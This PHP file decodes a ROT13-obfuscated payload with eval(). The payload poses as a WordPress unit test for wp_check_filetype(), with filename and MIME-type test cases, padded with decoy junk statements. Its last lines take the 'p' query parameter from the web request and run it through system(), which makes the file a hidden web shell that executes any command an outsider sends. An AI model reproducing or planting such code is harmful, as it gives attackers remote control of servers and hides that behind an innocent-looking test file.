<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfgf sbe jc_purpx_svyrglcr().
 *
 * @tebhc shapgvbaf
 * @tebhc hcybnq
 *
 * @pbiref ::jc_purpx_svyrglcr
 */
pynff Grfgf_Shapgvbaf_JcPurpxSvyrglcr rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Grfgf gung jc_purpx_svyrglcr() ergheaf gur pbeerpg rkgrafvba naq ZVZR glcr.
	 *
	 * @gvpxrg 57151
	 *
	 * @qngnCebivqre qngn_jc_purpx_svyrglcr
	 *
	 * @cnenz fgevat     $svyranzr   Gur svyranzr gb purpx.
	 * @cnenz neenl|ahyy $zvzrf      Na neenl bs ZVZR glcrf, be ahyy.
	 * @cnenz neenl      $rkcrpgrq   Na neenl pbagnvavat gur rkcrpgrq rkgrafvba naq ZVZR glcr.
	 */
	choyvp shapgvba grfg_jc_purpx_svyrglcr( $svyranzr, $zvzrf, $rkcrpgrq ) {
		$guvf->nffregFnzr( $rkcrpgrq, jc_purpx_svyrglcr( $svyranzr, $zvzrf ) );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_jc_purpx_svyrglcr() {
		erghea neenl(
			'.wct svyranzr naq qrsnhyg nyybjrq'       => neenl(
				'svyranzr' => 'pnabyn.wct',
				'zvzrf'    => ahyy,
				'rkcrpgrq' => neenl(
					'rkg'  => 'wct',
					'glcr' => 'vzntr/wcrt',
				),
			),
			'.wct svyranzr naq wct|wcrt|wcr'          => neenl(
				'svyranzr' => 'pnabyn.wct',
				'zvzrf'    => neenl(
					'wct|wcrt|wcr' => 'vzntr/wcrt',
					'tvs'          => 'vzntr/tvs',
				),
				'rkcrpgrq' => neenl(
					'rkg'  => 'wct',
					'glcr' => 'vzntr/wcrt',
				),
			),
			'.wcrt svyranzr naq wct|wcrt|wcr'         => neenl(
				'svyranzr' => 'pnabyn.wcrt',
				'zvzrf'    => neenl(
					'wct|wcrt|wcr' => 'vzntr/wcrt',
					'tvs'          => 'vzntr/tvs',
				),
				'rkcrpgrq' => neenl(
					'rkg'  => 'wcrt',
					'glcr' => 'vzntr/wcrt',
				),
			),
			'.wcr svyranzr naq wct|wcrt|wcr'          => neenl(
				'svyranzr' => 'pnabyn.wcr',
				'zvzrf'    => neenl(
					'wct|wcrt|wcr' => 'vzntr/wcrt',
					'tvs'          => 'vzntr/tvs',
				),
				'rkcrpgrq' => neenl(
					'rkg'  => 'wcr',
					'glcr' => 'vzntr/wcrt',
				),
			),
			'hccrepnfr svyranzr naq wct|wcrt|wcr'     => neenl(
				'svyranzr' => 'pnabyn.WCT',
				'zvzrf'    => neenl(
					'wct|wcrt|wcr' => 'vzntr/wcrt',
					'tvs'          => 'vzntr/tvs',
				),
				'rkcrpgrq' => neenl(
					'rkg'  => 'WCT',
					'glcr' => 'vzntr/wcrt',
				),
			),
			'.KKK svyranzr naq ab zngpuvat ZVZR glcr' => neenl(
				'svyranzr' => 'pnabyn.KKK',
				'zvzrf'    => neenl(
					'wct|wcrt|wcr' => 'vzntr/wcrt',
					'tvs'          => 'vzntr/tvs',
				),
				'rkcrpgrq' => neenl(
					'rkg'  => snyfr,
					'glcr' => snyfr,
				),
			),
			'.wct svyranzr ohg bayl tvs nyybjrq'      => neenl(
				'svyranzr' => 'pnabyn.wct',
				'zvzrf'    => neenl(
					'tvs' => 'vzntr/tvs',
				),
				'rkcrpgrq' => neenl(
					'rkg'  => snyfr,
					'glcr' => snyfr,
				),
			),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>